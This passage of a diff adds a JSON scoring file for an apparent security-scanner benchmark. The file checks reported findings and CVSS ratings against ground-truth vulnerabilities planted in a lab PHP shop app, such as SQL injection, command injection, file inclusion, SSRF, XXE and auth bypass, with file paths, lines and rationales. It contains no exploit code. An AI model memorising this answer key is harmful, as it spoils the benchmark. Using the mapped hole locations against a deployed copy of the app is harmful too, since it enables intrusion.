+      "primary_location": {
+        "path": "lab30-shop/app/public/account/update.php",
+        "line": 6
+      },
+      "cvss_expected": {
+        "version": "3.1",
+        "score_basis": "Base",
+        "base_score": 7.1,
+        "base_vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:H/A:N",
+        "metrics": {
+          "AV": "N",
+          "AC": "L",
+          "PR": "L",
+          "UI": "N",
+          "S": "U",
+          "C": "L",
+          "I": "H",
+          "A": "N"
+        },
+        "severity": "high"
+      },
+      "cvss_reported": {
+        "version": "3.1",
+        "score_basis": "Base",
+        "base_score": 7.1,
+        "base_vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:H/A:N",
+        "metrics": {
+          "AV": "N",
+          "AC": "L",
+          "PR": "L",
+          "UI": "N",
+          "S": "U",
+          "C": "L",
+          "I": "H",
+          "A": "N"
+        },
+        "severity": "high"
+      },
+      "cvss_error": null,
+      "cvss_status": "compared",
+      "cvss_score_delta": 0.0,
+      "cvss_score_error": 0.0,
+      "cvss_score_ok": true,
+      "cvss_vector_ok": true,
+      "severity_expected": "high",
+      "severity_reported": "high",
+      "severity_ok": true
+    }
+  ],
+  "truth_results": [
+    {
+      "id": "01",
+      "truth_id": "01",
+      "title": "商品搜索 SQL 注入",
+      "class": "sqli",
+      "detected": true,
+      "finding_id": "2aad233871a24c91a491d81b3fea08ac",
+      "scoring_locations": [
+        {
+          "path": "app/public/catalog/index.php",
+          "line": 4,
+          "line_sha256": "beffe7da46f3d071e3c354cab2096d3e67bf0c616e80ca230525ad7f5907b675",
+          "rationale": "用户检索词直接拼接 SQL 并执行 query。"
+        }
+      ],
+      "location": [
+        {
+          "path": "app/public/catalog/index.php",
+          "line": 4
+        }
+      ],
+      "primary_location": {
+        "path": "lab30-shop/app/public/catalog/index.php",
+        "line": 4
+      },
+      "rating": {
+        "cvss_expected": {
+          "version": "3.1",
+          "score_basis": "Base",
+          "base_score": 7.5,
+          "base_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
+          "metrics": {
+            "AV": "N",
+            "AC": "L",
+            "PR": "N",
+            "UI": "N",
+            "S": "U",
+            "C": "H",
+            "I": "N",
+            "A": "N"
+          },
+          "severity": "high"
+        },
+        "cvss_reported": {
+          "version": "3.1",
+          "score_basis": "Base",
+          "base_score": 8.2,
+          "base_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N",
+          "metrics": {
+            "AV": "N",
+            "AC": "L",
+            "PR": "N",
+            "UI": "N",
+            "S": "U",
+            "C": "H",
+            "I": "L",
+            "A": "N"
+          },
+          "severity": "high"
+        },
+        "cvss_error": null,
+        "cvss_status": "compared",
+        "cvss_score_delta": 0.7,
+        "cvss_score_error": 0.7,
+        "cvss_score_ok": false,
+        "cvss_vector_ok": false,
+        "severity_expected": "high",
+        "severity_reported": "high",
+        "severity_ok": true
+      }
+    },
+    {
+      "id": "02",
+      "truth_id": "02",
+      "title": "到店欢迎反射型 XSS",
+      "class": "xss_r",
+      "detected": true,
+      "finding_id": "5d49941ea36b4c14aaba5cec95eb33ce",
+      "scoring_locations": [
+        {
+          "path": "app/public/catalog/greeting.php",
+          "line": 3,
+          "line_sha256": "bde78a4a7c32af2ebe76205dc9e9b804f18f85e1100ac40e0a15a5b79ab06b0b",
+          "rationale": "未编码的用户名称进入 HTML 文本输出。"
+        }
+      ],
+      "location": [
+        {
+          "path": "app/public/catalog/greeting.php",
+          "line": 3
+        }
+      ],
+      "primary_location": {
+        "path": "lab30-shop/app/public/catalog/greeting.php",
+        "line": 3
+      },
+      "rating": {
+        "cvss_expected": {
+          "version": "3.1",
+          "score_basis": "Base",
+          "base_score": 6.1,
+          "base_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
+          "metrics": {
+            "AV": "N",
+            "AC": "L",
+            "PR": "N",
+            "UI": "R",
+            "S": "C",
+            "C": "L",
+            "I": "L",
+            "A": "N"
+          },
+          "severity": "medium"
+        },
+        "cvss_reported": null,
+        "cvss_error": null,
+        "cvss_status": "missing_reported",
+        "cvss_score_delta": null,
+        "cvss_score_error": null,
+        "cvss_score_ok": null,
+        "cvss_vector_ok": null,
+        "severity_expected": "medium",
+        "severity_reported": "unknown",
+        "severity_ok": false
+      }
+    },
+    {
+      "id": "03",
+      "truth_id": "03",
+      "title": "网络诊断命令注入",
+      "class": "command_injection",
+      "detected": true,
+      "finding_id": "7d557370dabe4a41ba0c681deb30a0a1",
+      "scoring_locations": [
+        {
+          "path": "app/public/ops/ping.php",
+          "line": 2,
+          "line_sha256": "9420da9ae249eb8fa54bba5abc2a363e03aed97d7a78ad9bcf3c9ac120bb7cae",
+          "rationale": "用户 host 拼接 shell_exec 参数，无 shell 参数转义。"
+        }
+      ],
+      "location": [
+        {
+          "path": "app/public/ops/ping.php",
+          "line": 2
+        }
+      ],
+      "primary_location": {
+        "path": "lab30-shop/app/public/ops/ping.php",
+        "line": 2
+      },
+      "rating": {
+        "cvss_expected": {
+          "version": "3.1",
+          "score_basis": "Base",
+          "base_score": 7.2,
+          "base_vector": "CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H",
+          "metrics": {
+            "AV": "N",
+            "AC": "L",
+            "PR": "H",
+            "UI": "N",
+            "S": "U",
+            "C": "H",
+            "I": "H",
+            "A": "H"
+          },
+          "severity": "high"
+        },
+        "cvss_reported": {
+          "version": "3.1",
+          "score_basis": "Base",
+          "base_score": 8.8,
+          "base_vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H",
+          "metrics": {
+            "AV": "N",
+            "AC": "L",
+            "PR": "L",
+            "UI": "N",
+            "S": "U",
+            "C": "H",
+            "I": "H",
+            "A": "H"
+          },
+          "severity": "high"
+        },
+        "cvss_error": null,
+        "cvss_status": "compared",
+        "cvss_score_delta": 1.6,
+        "cvss_score_error": 1.6,
+        "cvss_score_ok": false,
+        "cvss_vector_ok": false,
+        "severity_expected": "high",
+        "severity_reported": "high",
+        "severity_ok": true
+      }
+    },
+    {
+      "id": "04",
+      "truth_id": "04",
+      "title": "帮助文档路径遍历读取任意文件",
+      "class": "path_traversal",
+      "detected": true,
+      "finding_id": "eac118f98bf744b498228eacf22fd396",
+      "scoring_locations": [
+        {
+          "path": "app/public/support/download.php",
+          "line": 3,
+          "line_sha256": "18400287d034179782608795cb1c445824259d3fad802d9b70a3901ccb828386",
+          "rationale": "用户文件名拼接数据目录后直接读取，无规范化边界校验。"
+        }
+      ],
+      "location": [
+        {
+          "path": "app/public/support/download.php",
+          "line": 3
+        }
+      ],
+      "primary_location": {
+        "path": "lab30-shop/app/public/support/download.php",
+        "line": 3
+      },
+      "rating": {
+        "cvss_expected": {
+          "version": "3.1",
+          "score_basis": "Base",
+          "base_score": 6.5,
+          "base_vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N",
+          "metrics": {
+            "AV": "N",
+            "AC": "L",
+            "PR": "L",
+            "UI": "N",
+            "S": "U",
+            "C": "H",
+            "I": "N",
+            "A": "N"
+          },
+          "severity": "medium"
+        },
+        "cvss_reported": {
+          "version": "3.1",
+          "score_basis": "Base",
+          "base_score": 6.5,
+          "base_vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N",
+          "metrics": {
+            "AV": "N",
+            "AC": "L",
+            "PR": "L",
+            "UI": "N",
+            "S": "U",
+            "C": "H",
+            "I": "N",
+            "A": "N"
+          },
+          "severity": "medium"
+        },
+        "cvss_error": null,
+        "cvss_status": "compared",
+        "cvss_score_delta": 0.0,
+        "cvss_score_error": 0.0,
+        "cvss_score_ok": true,
+        "cvss_vector_ok": true,
+        "severity_expected": "medium",
+        "severity_reported": "medium",
+        "severity_ok": true
+      }
+    },
+    {
+      "id": "05",
+      "truth_id": "05",
+      "title": "内容中心本地文件包含",
+      "class": "lfi",
+      "detected": true,
+      "finding_id": "5783491e92f4458082050a3863ac0095",
+      "scoring_locations": [
+        {
+          "path": "app/public/content/page.php",
+          "line": 3,
+          "line_sha256": "01ecb58858c8af3162d88b2c183e42d4dc4146a98e34000a42f3223376e85583",
+          "rationale": "用户 page 拼接模板路径后 include，无路径约束。"
+        }
+      ],
+      "location": [
+        {
+          "path": "app/public/content/page.php",
+          "line": 3
+        }
+      ],
+      "primary_location": {
+        "path": "lab30-shop/app/public/content/page.php",
+        "line": 3
+      },
+      "rating": {
+        "cvss_expected": {
+          "version": "3.1",
+          "score_basis": "Base",
+          "base_score": 5.3,
+          "base_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
+          "metrics": {
+            "AV": "N",
+            "AC": "L",
+            "PR": "N",
+            "UI": "N",
+            "S": "U",
+            "C": "L",
+            "I": "N",
+            "A": "N"
+          },
+          "severity": "medium"
+        },
+        "cvss_reported": {
+          "version": "3.1",
+          "score_basis": "Base",
+          "base_score": 5.3,
+          "base_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
+          "metrics": {
+            "AV": "N",
+            "AC": "L",
+            "PR": "N",
+            "UI": "N",
+            "S": "U",
+            "C": "L",
+            "I": "N",
+            "A": "N"
+          },
+          "severity": "medium"
+        },
+        "cvss_error": null,
+        "cvss_status": "compared",
+        "cvss_score_delta": 0.0,
+        "cvss_score_error": 0.0,
+        "cvss_score_ok": true,
+        "cvss_vector_ok": true,
+        "severity_expected": "medium",
+        "severity_reported": "medium",
+        "severity_ok": true
+      }
+    },
+    {
+      "id": "06",
+      "truth_id": "06",
+      "title": "远程模板预览远程文件包含",
+      "class": "rfi",
+      "detected": true,
+      "finding_id": "633719c82cd64d56bc043d63f5b5df83",
+      "scoring_locations": [
+        {
+          "path": "app/public/ops/template-preview.php",
+          "line": 3,
+          "line_sha256": "9bd126053a56cceb5676fb20fed2c1aa9b0890297dbd456684a0f6cac0e44698",
+          "rationale": "用户提供的远程模板地址直接 include。"
+        }
+      ],
+      "location": [
+        {
+          "path": "app/public/ops/template-preview.php",
+          "line": 3
+        }
+      ],
+      "primary_location": {
+        "path": "lab30-shop/app/public/ops/template-preview.php",
+        "line": 3
+      },
+      "rating": {
+        "cvss_expected": {
+          "version": "3.1",
+          "score_basis": "Base",
+          "base_score": 7.2,
+          "base_vector": "CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H",
+          "metrics": {
+            "AV": "N",
+            "AC": "L",
+            "PR": "H",
+            "UI": "N",
+            "S": "U",
+            "C": "H",
+            "I": "H",
+            "A": "H"
+          },
+          "severity": "high"
+        },
+        "cvss_reported": {
+          "version": "3.1",
+          "score_basis": "Base",
+          "base_score": 7.2,
+          "base_vector": "CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H",
+          "metrics": {
+            "AV": "N",
+            "AC": "L",
+            "PR": "H",
+            "UI": "N",
+            "S": "U",
+            "C": "H",
+            "I": "H",
+            "A": "H"
+          },
+          "severity": "high"
+        },
+        "cvss_error": null,
+        "cvss_status": "compared",
+        "cvss_score_delta": 0.0,
+        "cvss_score_error": 0.0,
+        "cvss_score_ok": true,
+        "cvss_vector_ok": true,
+        "severity_expected": "high",
+        "severity_reported": "high",
+        "severity_ok": true
+      }
+    },
+    {
+      "id": "07",
+      "truth_id": "07",
+      "title": "运营公式动态函数调用代码执行",
+      "class": "code_execution",
+      "detected": false,
+      "finding_id": null,
+      "scoring_locations": [
+        {
+          "path": "app/public/ops/formula.php",
+          "line": 3,
+          "line_sha256": "b19cc75cb9b92d69d482f8fe626389c836cb73d63bc563cdcb374148ac192812",
+          "rationale": "用户选择函数名并控制调用参数，缺少允许函数清单。"
+        }
+      ],
+      "location": [
+        {
+          "path": "app/public/ops/formula.php",
+          "line": 3
+        }
+      ],
+      "primary_location": null
+    },
+    {
+      "id": "08",
+      "truth_id": "08",
+      "title": "继续访问开放重定向",
+      "class": "open_redirect",
+      "detected": true,
+      "finding_id": "d5eedb8664a24e029b3279ca593c5f5b",
+      "scoring_locations": [
+        {
+          "path": "app/public/auth/continue.php",
+          "line": 3,
+          "line_sha256": "1f0b75a5fd28bf348d7394d0ddc7dc2fe0df29d01ba17ada286ab9304404afbf",
+          "rationale": "未校验目的域名的 next 直接进入 Location 响应头。"
+        }
+      ],
+      "location": [
+        {
+          "path": "app/public/auth/continue.php",
+          "line": 3
+        }
+      ],
+      "primary_location": {
+        "path": "lab30-shop/app/public/auth/continue.php",
+        "line": 3
+      },
+      "rating": {
+        "cvss_expected": {
+          "version": "3.1",
+          "score_basis": "Base",
+          "base_score": 0.0,
+          "base_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:N",
+          "metrics": {
+            "AV": "N",
+            "AC": "L",
+            "PR": "N",
+            "UI": "R",
+            "S": "U",
+            "C": "N",
+            "I": "N",
+            "A": "N"
+          },
+          "severity": "none"
+        },
+        "cvss_reported": {
+          "version": "3.1",
+          "score_basis": "Base",
+          "base_score": 4.3,
+          "base_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:L/A:N",
+          "metrics": {
+            "AV": "N",
+            "AC": "L",
+            "PR": "N",
+            "UI": "R",
+            "S": "U",
+            "C": "N",
+            "I": "L",
+            "A": "N"
+          },
+          "severity": "medium"
+        },
+        "cvss_error": null,
+        "cvss_status": "compared",
+        "cvss_score_delta": 4.3,
+        "cvss_score_error": 4.3,
+        "cvss_score_ok": false,
+        "cvss_vector_ok": false,
+        "severity_expected": "none",
+        "severity_reported": "medium",
+        "severity_ok": false
+      }
+    },
+    {
+      "id": "09",
+      "truth_id": "09",
+      "title": "数据库诊断异常与堆栈信息泄露",
+      "class": "info_disclosure",
+      "detected": false,
+      "finding_id": null,
+      "scoring_locations": [
+        {
+          "path": "app/public/ops/database.php",
+          "line": 3,
+          "line_sha256": "e78884061f4c4b81c82941cb05fa6ad4522f0f1565fdec2bdffeae193a6e0fce",
+          "rationale": "异常类型、消息和完整堆栈直接拼入页面输出。"
+        },
+        {
+          "path": "app/public/ops/database.php",
+          "line": 4,
+          "line_sha256": "0a928e56e8e51b9557dc4c79294611f7c293246f1d7a42b73e79a56fc1617cc6",
+          "rationale": "页面输出未经隐藏处理的诊断异常消息和堆栈；HTML 转义不消除信息泄露。"
+        }
+      ],
+      "location": [
+        {
+          "path": "app/public/ops/database.php",
+          "line": 3
+        }
+      ],
+      "primary_location": null
+    },
+    {
+      "id": "10",
+      "truth_id": "10",
+      "title": "使用 MD5 存储密码",
+      "class": "weak_crypto",
+      "detected": false,
+      "finding_id": null,
+      "scoring_locations": [
+        {
+          "path": "app/public/auth/register.php",
+          "line": 8,
+          "line_sha256": "a231629824f2b856423cfaf35a47e1af2b791b88241ac2d32ea979a3a4099923",
+          "rationale": "注册密码以无盐快速 MD5 形式写入 password_md5。"
+        },
+        {
+          "path": "app/src/setup.php",
+          "line": 17,
+          "line_sha256": "e23345e7042ee9c9cee6290475dcebee0cac02f9d3a2852c2cd5ae8390045b8a",
+          "rationale": "初始化用户密码以无盐 MD5 形式写入用户表。"
+        }
+      ],
+      "location": [
+        {
+          "path": "app/public/auth/register.php",
+          "line": 8
+        },
+        {
+          "path": "app/src/setup.php",
+          "line": 17
+        }
+      ],
+      "primary_location": null
+    },
+    {
+      "id": "11",
+      "truth_id": "11",
+      "title": "在线留言存储型 XSS",
+      "class": "xss_s",
+      "detected": true,
+      "finding_id": "43b0838f093d472c9143038ec56e1e96",
+      "scoring_locations": [
+        {
+          "path": "app/public/support/messages.php",
+          "line": 5,
+          "line_sha256": "e1df15bc3431b02f261af85b540e7427cfae28b52053db5de25a7df0373a2378",
+          "rationale": "持久化用户留言直接进入 HTML，不执行输出编码。"
+        }
+      ],
+      "location": [
+        {
+          "path": "app/public/support/messages.php",
+          "line": 5
+        }
+      ],
+      "primary_location": {
+        "path": "lab30-shop/app/public/support/messages.php",
+        "line": 5
+      },
+      "rating": {
+        "cvss_expected": {
+          "version": "3.1",
+          "score_basis": "Base",
+          "base_score": 5.4,
+          "base_vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N",
+          "metrics": {
+            "AV": "N",
+            "AC": "L",
+            "PR": "L",
+            "UI": "R",
+            "S": "C",
+            "C": "L",
+            "I": "L",
+            "A": "N"
+          },
+          "severity": "medium"
+        },
+        "cvss_reported": null,
+        "cvss_error": null,
+        "cvss_status": "missing_reported",
+        "cvss_score_delta": null,
+        "cvss_score_error": null,
+        "cvss_score_ok": null,
+        "cvss_vector_ok": null,
+        "severity_expected": "medium",
+        "severity_reported": "unknown",
+        "severity_ok": false
+      }
+    },
+    {
+      "id": "12",
+      "truth_id": "12",
+      "title": "链接预览服务端请求伪造",
+      "class": "ssrf",
+      "detected": true,
+      "finding_id": "bc328ee5aef640c58a4a4f22afe0015e",
+      "scoring_locations": [
+        {
+          "path": "app/public/ops/url-preview.php",
+          "line": 3,
+          "line_sha256": "7c71772702bac10d8d234b0d0a8dfc408153bc059dcef867254ba35f29cda6a9",
+          "rationale": "任意用户 URL 传入服务器 file_get_contents，无目标允许清单。"
+        }
+      ],
+      "location": [
+        {
+          "path": "app/public/ops/url-preview.php",
+          "line": 3
+        }
+      ],
+      "primary_location": {
+        "path": "lab30-shop/app/public/ops/url-preview.php",
+        "line": 3
+      },
+      "rating": {
+        "cvss_expected": {
+          "version": "3.1",
+          "score_basis": "Base",
+          "base_score": 4.9,
+          "base_vector": "CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:N/A:N",
+          "metrics": {
+            "AV": "N",
+            "AC": "L",
+            "PR": "H",
+            "UI": "N",
+            "S": "U",
+            "C": "H",
+            "I": "N",
+            "A": "N"
+          },
+          "severity": "medium"
+        },
+        "cvss_reported": {
+          "version": "3.1",
+          "score_basis": "Base",
+          "base_score": 4.3,
+          "base_vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N",
+          "metrics": {
+            "AV": "N",
+            "AC": "L",
+            "PR": "L",
+            "UI": "N",
+            "S": "U",
+            "C": "L",
+            "I": "N",
+            "A": "N"
+          },
+          "severity": "medium"
+        },
+        "cvss_error": null,
+        "cvss_status": "compared",
+        "cvss_score_delta": -0.6,
+        "cvss_score_error": 0.6,
+        "cvss_score_ok": false,
+        "cvss_vector_ok": false,
+        "severity_expected": "medium",
+        "severity_reported": "medium",
+        "severity_ok": true
+      }
+    },
+    {
+      "id": "13",
+      "truth_id": "13",
+      "title": "合作方配置导入 XXE",
+      "class": "xxe",
+      "detected": true,
+      "finding_id": "addbc91072b7478c8aa7d68521c49c73",
+      "scoring_locations": [
+        {
+          "path": "app/public/ops/xml-import.php",
+          "line": 3,
+          "line_sha256": "e463934898ab6cb2064502fc48cb73574f6b237924606e707d33c482dd7f3f06",
+          "rationale": "不可信 XML 使用 LIBXML_NOENT 和 LIBXML_DTDLOAD 展开外部实体。"
+        }
+      ],
+      "location": [
+        {
+          "path": "app/public/ops/xml-import.php",
+          "line": 3
+        }
+      ],
+      "primary_location": {
+        "path": "lab30-shop/app/public/ops/xml-import.php",
+        "line": 3
+      },
+      "rating": {
+        "cvss_expected": {
+          "version": "3.1",
+          "score_basis": "Base",
+          "base_score": 4.9,
+          "base_vector": "CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:N/A:N",
+          "metrics": {
+            "AV": "N",
+            "AC": "L",
+            "PR": "H",
+            "UI": "N",
+            "S": "U",
+            "C": "H",
+            "I": "N",
+            "A": "N"
+          },
+          "severity": "medium"
+        },
+        "cvss_reported": {
+          "version": "3.1",
+          "score_basis": "Base",
+          "base_score": 6.5,
+          "base_vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N",
+          "metrics": {
+            "AV": "N",
+            "AC": "L",
+            "PR": "L",
+            "UI": "N",
+            "S": "U",
+            "C": "H",
+            "I": "N",
+            "A": "N"
+          },
+          "severity": "medium"
+        },
+        "cvss_error": null,
+        "cvss_status": "compared",
+        "cvss_score_delta": 1.6,
+        "cvss_score_error": 1.6,
+        "cvss_score_ok": false,
+        "cvss_vector_ok": false,
+        "severity_expected": "medium",
+        "severity_reported": "medium",
+        "severity_ok": true
+      }
+    },
+    {
+      "id": "14",
+      "truth_id": "14",
+      "title": "邮箱设置跨站请求伪造",
+      "class": "csrf",
+      "detected": false,
+      "finding_id": null,
+      "scoring_locations": [
+        {
+          "path": "app/public/account/settings.php",
+          "line": 5,
+          "line_sha256": "53f409fd8b888dc72278f1bb483f4bb3a0097af02379243396b9bc2092248f29",
+          "rationale": "已认证用户邮箱更新操作缺失 CSRF 令牌检查。"
+        }
+      ],
+      "location": [
+        {
+          "path": "app/public/account/settings.php",
+          "line": 5
+        }
+      ],
+      "primary_location": null
+    },
+    {
+      "id": "15",
+      "truth_id": "15",
+      "title": "会员备份不安全反序列化权益篡改",
+      "class": "insecure_deserialization",
+      "detected": true,
+      "finding_id": "e4c0d7fa5c0640dbb7e81a774b02ae04",
+      "scoring_locations": [
+        {
+          "path": "app/public/account/backup.php",
+          "line": 5,
+          "line_sha256": "bb6cd41856580981d3f89d24aa955bb9e1074d1b03212c8f13245a346d8e9bc1",
+          "rationale": "未设置 allowed_classes 的不可信反序列化，之后的类型判断发生过晚。"
+        }
+      ],
+      "location": [
+        {
+          "path": "app/public/account/backup.php",
+          "line": 5
+        }
+      ],
+      "primary_location": {
+        "path": "lab30-shop/app/public/account/backup.php",
+        "line": 5
+      },
+      "rating": {
+        "cvss_expected": {
+          "version": "3.1",
+          "score_basis": "Base",
+          "base_score": 4.3,
+          "base_vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:N",
+          "metrics": {
+            "AV": "N",
+            "AC": "L",
+            "PR": "L",
+            "UI": "N",
+            "S": "U",
+            "C": "N",
+            "I": "L",
+            "A": "N"
+          },
+          "severity": "medium"
+        },
+        "cvss_reported": null,
+        "cvss_error": null,
+        "cvss_status": "missing_reported",
+        "cvss_score_delta": null,
+        "cvss_score_error": null,
+        "cvss_score_ok": null,
+        "cvss_vector_ok": null,
+        "severity_expected": "medium",
+        "severity_reported": "unknown",
+        "severity_ok": false
+      }
+    },
+    {
+      "id": "16",
+      "truth_id": "16",
+      "title": "订单详情越权访问（IDOR）",
+      "class": "idor",
+      "detected": true,
+      "finding_id": "6f9baa7bb5694f4e8d2f1635f38c7d9f",
+      "scoring_locations": [
+        {
+          "path": "app/public/orders/detail.php",
+          "line": 2,
+          "line_sha256": "0b45c2674e8bb6ef3d17c37a2bdc9c42e02c5f6bf60881f99fce938599078930",
+          "rationale": "按用户控制订单 ID 查询，无订单 user_id 归属限制。"
+        }
+      ],
+      "location": [
+        {
+          "path": "app/public/orders/detail.php",
+          "line": 2
+        }
+      ],
+      "primary_location": {
+        "path": "lab30-shop/app/public/orders/detail.php",
+        "line": 2
+      },
+      "rating": {
+        "cvss_expected": {
+          "version": "3.1",
+          "score_basis": "Base",
+          "base_score": 6.5,
+          "base_vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N",
+          "metrics": {
+            "AV": "N",
+            "AC": "L",
+            "PR": "L",
+            "UI": "N",
+            "S": "U",
+            "C": "H",
+            "I": "N",
+            "A": "N"
+          },
+          "severity": "medium"
+        },
+        "cvss_reported": {
+          "version": "3.1",
+          "score_basis": "Base",
+          "base_score": 6.5,
+          "base_vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N",
+          "metrics": {
+            "AV": "N",
+            "AC": "L",
+            "PR": "L",
+            "UI": "N",
+            "S": "U",
+            "C": "H",
+            "I": "N",
+            "A": "N"
+          },
+          "severity": "medium"
+        },
+        "cvss_error": null,
+        "cvss_status": "compared",
+        "cvss_score_delta": 0.0,
+        "cvss_score_error": 0.0,
+        "cvss_score_ok": true,
+        "cvss_vector_ok": true,
+        "severity_expected": "medium",
+        "severity_reported": "medium",
+        "severity_ok": true
+      }
+    },
+    {
+      "id": "17",
+      "truth_id": "17",
+      "title": "人员管理信任客户端角色 Cookie 权限绕过",
+      "class": "auth_bypass",
+      "detected": false,
+      "finding_id": null,
+      "scoring_locations": [
+        {
+          "path": "app/public/ops/users.php",
+          "line": 2,
+          "line_sha256": "2c144459341e60bd6a9a03ae60ef87881d140dd3d089e584f9fcf546229f4e36",
+          "rationale": "客户端 role Cookie 覆盖真实用户角色并决定管理员授权。"
+        }
+      ],
+      "location": [
+        {
+          "path": "app/public/ops/users.php",
+          "line": 2
+        }
+      ],
+      "primary_location": null
+    },
+    {
+      "id": "18",
+      "truth_id": "18",
+      "title": "维护接口信任请求头认证绕过",
+      "class": "auth_bypass",
+      "detected": false,
+      "finding_id": null,
+      "scoring_locations": [
+        {
+          "path": "app/public/ops/maintenance.php",
+          "line": 3,
+          "line_sha256": "3df8df57413258463abaea08fa6fcce33fe128751d9848cf7962a2cc0a8f18d3",
+          "rationale": "仅依赖客户端 X-Admin 请求头决定维护服务授权。"
+        }
+      ],
+      "location": [
+        {
+          "path": "app/public/ops/maintenance.php",
+          "line": 3
+        }
+      ],
+      "primary_location": null
+    },
+    {
+      "id": "19",
+      "truth_id": "19",
+      "title": "下单信任客户端单价金额篡改",
+      "class": "price_manipulation",
+      "detected": true,
+      "finding_id": "7c8e155d6b5741d7be73c3dab2bc6a10",
+      "scoring_locations": [
+        {
+          "path": "app/public/orders/create.php",
+          "line": 3,
+          "line_sha256": "f8bca8b689b32a51ea0fa3eb226047c9a64c8eb9c8085b8211c31db263d9ebfd",
+          "rationale": "订单单价取自客户端 POST price 而非已读取的服务端商品记录。"
+        },
+        {
+          "path": "app/public/orders/create.php",
+          "line": 5,
+          "line_sha256": "7b36f5f1102b5b2e73b185de7df3ea0bccf240d9ba391f88365b67cd0991f325",
+          "rationale": "直接以客户端单价计算订单总价。"
+        },
+        {
+          "path": "app/public/orders/create.php",
+          "line": 7,
+          "line_sha256": "2a1a65f646c4e6f459858146edc063f2d7e9a96a1127b71e98b2a27d6c23643a",
+          "rationale": "将客户端单价和据此计算的总价持久化为订单价格。"
+        }
+      ],
+      "location": [
+        {
+          "path": "app/public/orders/create.php",
+          "line": 3
+        },
+        {
+          "path": "app/public/orders/create.php",
+          "line": 5
+        }
+      ],
+      "primary_location": {
+        "path": "lab30-shop/app/public/orders/create.php",
+        "line": 5
+      },
+      "rating": {
+        "cvss_expected": {
+          "version": "3.1",
+          "score_basis": "Base",
+          "base_score": 6.5,
+          "base_vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N",
+          "metrics": {
+            "AV": "N",
+            "AC": "L",
+            "PR": "L",
+            "UI": "N",
+            "S": "U",
+            "C": "N",
+            "I": "H",
+            "A": "N"
+          },
+          "severity": "medium"
+        },
+        "cvss_reported": {
+          "version": "3.1",
+          "score_basis": "Base",
+          "base_score": 6.5,
+          "base_vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N",
+          "metrics": {
+            "AV": "N",
+            "AC": "L",
+            "PR": "L",
+            "UI": "N",
+            "S": "U",
+            "C": "N",
+            "I": "H",
+            "A": "N"
+          },
+          "severity": "medium"
+        },
+        "cvss_error": null,
+        "cvss_status": "compared",
+        "cvss_score_delta": 0.0,
+        "cvss_score_error": 0.0,
+        "cvss_score_ok": true,
+        "cvss_vector_ok": true,
+        "severity_expected": "medium",
+        "severity_reported": "medium",
+        "severity_ok": true
+      }
+    },
+    {
+      "id": "20",
+      "truth_id": "20",
+      "title": "提现竞争条件重复支付",
+      "class": "race_condition",
+      "detected": true,
+      "finding_id": "168e43edeee643d6a8d80cfc004090ba",
+      "scoring_locations": [
+        {
+          "path": "app/public/wallet/withdraw.php",
+          "line": 4,
+          "line_sha256": "cbe6f3296cf5b7d32dfdcdb71ece7e5f4a0fd1a9a489bad868b51ac928848aec",
+          "rationale": "余额读取不加锁，与后续写入及提现记录缺少原子事务。"
+        },
+        {
+          "path": "app/public/wallet/withdraw.php",
+          "line": 7,
+          "line_sha256": "a776c4ce70272bf6ce67b9bd10738dab70c6a0039a6d2790f7bae7f36099a70b",
+          "rationale": "以过时余额计算并覆盖更新，缺少余额条件的原子扣款。"
+        },
+        {
+          "path": "app/public/wallet/withdraw.php",
+          "line": 8,
+          "line_sha256": "a414d1c3d23923668f66b17a88d491d780ae62c4c7695dcac2e7c8d063a094f0",
+          "rationale": "提现记录与余额检查及扣款缺少同一受锁事务。"
+        }
+      ],
+      "location": [
+        {
+          "path": "app/public/wallet/withdraw.php",
+          "line": 3
+        },
+        {
+          "path": "app/public/wallet/withdraw.php",
+          "line": 7
+        }
+      ],
+      "primary_location": {
+        "path": "lab30-shop/app/public/wallet/withdraw.php",
+        "line": 7
+      },
+      "rating": {
+        "cvss_expected": {
+          "version": "3.1",
+          "score_basis": "Base",
+          "base_score": 5.3,
+          "base_vector": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:N/I:H/A:N",
+          "metrics": {
+            "AV": "N",
+            "AC": "H",
+            "PR": "L",
+            "UI": "N",
+            "S": "U",
+            "C": "N",
+            "I": "H",
+            "A": "N"
+          },
+          "severity": "medium"
+        },
+        "cvss_reported": {
+          "version": "3.1",
+          "score_basis": "Base",
+          "base_score": 5.3,
+          "base_vector": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:N/I:H/A:N",
+          "metrics": {
+            "AV": "N",
+            "AC": "H",
+            "PR": "L",
+            "UI": "N",
